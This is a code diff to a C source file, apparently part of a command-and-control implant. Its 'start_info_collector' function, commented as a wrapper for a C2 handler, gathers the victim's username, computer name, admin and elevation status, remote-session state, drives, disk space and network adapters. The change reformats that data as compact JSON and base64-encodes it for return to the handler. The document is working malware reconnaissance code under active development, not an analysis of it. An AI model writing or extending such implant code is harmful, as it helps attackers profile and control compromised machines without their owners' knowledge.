@@ -143,35 +143,21 @@ void FreeSystemInfo(SystemInfo* info) {
 }
 
 // Start info collector - wrapper function for C2 handler
-// Returns system information data (no console output)
+// Returns system information data as base64 encoded JSON
 char* start_info_collector() {
     // Collect system information
     SystemInfo* info = CollectSystemInfo();
     
     if (info) {
-        // Allocate buffer for system info output
-        char *result = (char*)malloc(8192);
-        if (!result) {
+        // Allocate buffer for system info output (JSON format)
+        char *json_result = (char*)malloc(8192);
+        if (!json_result) {
             FreeSystemInfo(info);
             return NULL;
         }
         
-        snprintf(result, 8192,
-                 "{\n"
-                 "  \"username\": \"%s\",\n"
-                 "  \"computername\": \"%s\",\n"
-                 "  \"screen_width\": %d,\n"
-                 "  \"screen_height\": %d,\n"
-                 "  \"monitors\": %d,\n"
-                 "  \"admin\": %s,\n"
-                 "  \"elevated\": %s,\n"
-                 "  \"remote_session\": %s,\n"
-                 "  \"mouse_present\": %s,\n"
-                 "  \"logical_drives\": %d,\n"
-                 "  \"free_disk_space_mb\": %llu,\n"
-                 "  \"total_disk_space_mb\": %llu,\n"
-                 "  \"network_adapters\": %d\n"
-                 "}",
+        snprintf(json_result, 8192,
+                 "{\"username\":\"%s\",\"computername\":\"%s\",\"screen_width\":%d,\"screen_height\":%d,\"monitors\":%d,\"admin\":%s,\"elevated\":%s,\"remote_session\":%s,\"mouse_present\":%s,\"logical_drives\":%d,\"free_disk_space_mb\":%llu,\"total_disk_space_mb\":%llu,\"network_adapters\":%d}",
                  info->username,
                  info->computername,
                  info->screenWidth, info->screenHeight,
@@ -186,7 +172,12 @@ char* start_info_collector() {
                  info->numNetworkAdapters);
         
         FreeSystemInfo(info);
-        return result;
+        
+        // Encode JSON result as base64
+        char* base64_result = base64_encode((unsigned char*)json_result, strlen(json_result));
+        free(json_result);
+        
+        return base64_result;
     }
     
     return NULL;
